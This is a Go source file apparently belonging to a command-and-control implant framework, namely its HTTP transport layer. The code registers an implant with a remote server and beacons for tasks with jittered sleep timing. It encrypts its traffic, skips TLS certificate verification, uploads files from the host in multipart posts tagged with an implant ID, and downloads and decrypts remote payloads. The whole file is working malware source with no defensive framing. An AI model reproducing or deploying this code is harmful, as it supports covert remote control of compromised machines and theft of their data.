package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"mime/multipart"
	"time"

	"github.com/carved4/carved/shared/crypto"
	"github.com/carved4/carved/shared/proto"
	"github.com/carved4/net/pkg/net"
)

var UserAgent string

type HTTPTransport struct {
	config    *Config
	implantID string
}

func NewHTTPTransport(cfg *Config, implantID string) *HTTPTransport {
	UserAgent = cfg.UserAgent
	return &HTTPTransport{
		config:    cfg,
		implantID: implantID,
	}
}

func (t *HTTPTransport) Register(meta *proto.ImplantMeta) error {
	data, err := json.Marshal(meta)
	if err != nil {
		return err
	}
	_, err = t.post("/register", data)
	return err
}

func (t *HTTPTransport) Beacon(results []*proto.TaskResult) ([]*proto.Task, error) {
	beacon := &proto.Beacon{
		ImplantID: t.implantID,
		Results:   results,
	}

	data, err := json.Marshal(beacon)
	if err != nil {
		return nil, err
	}

	respData, err := t.post("/beacon", data)
	if err != nil {
		return nil, err
	}

	var resp proto.BeaconResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, err
	}

	return resp.Tasks, nil
}

func (t *HTTPTransport) Sleep() time.Duration {
	base := time.Duration(t.config.Sleep) * time.Second
	if t.config.Jitter == 0 {
		return base
	}
	jitterMax := float64(base) * (float64(t.config.Jitter) / 100.0)
	jitter := time.Duration(rand.Float64() * jitterMax)
	return base + jitter
}

func (t *HTTPTransport) UpdateSleep(sleep uint32, jitter uint8) {
	t.config.Sleep = sleep
	t.config.Jitter = jitter
}

func (t *HTTPTransport) post(endpoint string, body []byte) ([]byte, error) {
	baseURL := t.config.ServerURL
	if len(baseURL) > 0 && baseURL[len(baseURL)-1] == '/' {
		baseURL = baseURL[:len(baseURL)-1]
	}
	url := baseURL + endpoint

	encrypted, err := crypto.Encrypt(body)
	if err != nil {
		return nil, fmt.Errorf("encrypt failed: %w", err)
	}

	respData, err := httpRequest(url, "POST", encrypted, t.config.UserAgent)
	if err != nil {
		return nil, err
	}

	decrypted, err := crypto.Decrypt(respData)
	if err != nil {
		return nil, fmt.Errorf("decrypt failed: %w", err)
	}

	return decrypted, nil
}

func (t *HTTPTransport) PostMultipart(endpoint string, fields map[string]string, files map[string][]byte) error {
	baseURL := t.config.ServerURL
	if len(baseURL) > 0 && baseURL[len(baseURL)-1] == '/' {
		baseURL = baseURL[:len(baseURL)-1]
	}
	url := baseURL + endpoint

	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	for key, value := range fields {
		if err := w.WriteField(key, value); err != nil {
			return err
		}
	}

	for filename, data := range files {
		fw, err := w.CreateFormFile("files", filename)
		if err != nil {
			return err
		}
		if _, err := fw.Write(data); err != nil {
			return err
		}
	}

	if err := w.Close(); err != nil {
		return err
	}

	resp, err := httpRequestWithHeaders(url, "POST", b.Bytes(), t.config.UserAgent, map[string]string{
		"Content-Type": w.FormDataContentType(),
		"X-Implant-ID": t.implantID,
	})
	if err != nil {
		return err
	}
	if string(resp) != "ok" {
		// Just check for success, handling empty response or specific api response is context dependent
	}
	return nil
}

func httpRequest(url, method string, body []byte, userAgent string) ([]byte, error) {
	return httpRequestWithHeaders(url, method, body, userAgent, nil)
}

func httpRequestWithHeaders(url, method string, body []byte, userAgent string, headers map[string]string) ([]byte, error) {
	if userAgent == "" {
		userAgent = UserAgent
	}

	cfg := &net.Config{
		UserAgent:  userAgent,
		Headers:    make(map[string]string),
		SkipVerify: true,
	}

	if method == "POST" && len(body) > 0 {
		hasContentType := false
		for k := range headers {
			if k == "Content-Type" || k == "content-type" {
				hasContentType = true
				break
			}
		}
		if !hasContentType {
			cfg.Headers["Content-Type"] = "application/json"
		}
	}

	for k, v := range headers {
		cfg.Headers[k] = v
	}

	if method == "GET" {
		return net.Get(url, cfg)
	}
	return net.Post(url, body, cfg)
}

func Get(url string) ([]byte, error) {
	respData, err := net.Get(url, nil)
	if err != nil {
		return nil, err
	}
	return crypto.Decrypt(respData)
}

func DownloadRaw(url string) ([]byte, error) {
	return net.Get(url, nil)
}

func Download(url string) ([]byte, error) {
	data, err := DownloadRaw(url)
	if err != nil {
		return nil, err
	}
	return crypto.Decrypt(data)
}

func (t *HTTPTransport) Close() error {
	return nil
}

func IsSameOrigin(urlA, urlB string) bool {
	if len(urlA) < 8 || len(urlB) < 8 {
		return false
	}

	aHost, aPort := parseOrigin(urlA)
	bHost, bPort := parseOrigin(urlB)

	return stringsEqualFold(aHost, bHost) && aPort == bPort
}

func parseOrigin(url string) (string, uint16) {
	var host string
	var port uint16 = 443

	var remaining string
	if len(url) >= 8 && url[:8] == "https://" {
		remaining = url[8:]
	} else if len(url) >= 7 && url[:7] == "http://" {
		remaining = url[7:]
		port = 80
	} else {
		return "", 0
	}

	slashPos := -1
	colonPos := -1
	for i := 0; i < len(remaining); i++ {
		if remaining[i] == ':' && colonPos == -1 {
			colonPos = i
		}
		if remaining[i] == '/' {
			slashPos = i
			break
		}
	}

	hostEnd := len(remaining)
	if slashPos != -1 {
		hostEnd = slashPos
	}

	hostPart := remaining[:hostEnd]

	if colonPos != -1 && colonPos < hostEnd {
		host = hostPart[:colonPos]
		portStr := hostPart[colonPos+1:]
		var p int
		for i := 0; i < len(portStr); i++ {
			c := portStr[i]
			if c >= '0' && c <= '9' {
				p = p*10 + int(c-'0')
			}
		}
		if p > 0 && p < 65536 {
			port = uint16(p)
		}
	} else {
		host = hostPart
	}

	return host, port
}

func stringsEqualFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 'a' - 'A'
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 'a' - 'A'
		}
		if ca != cb {
			return false
		}
	}
	return true
}
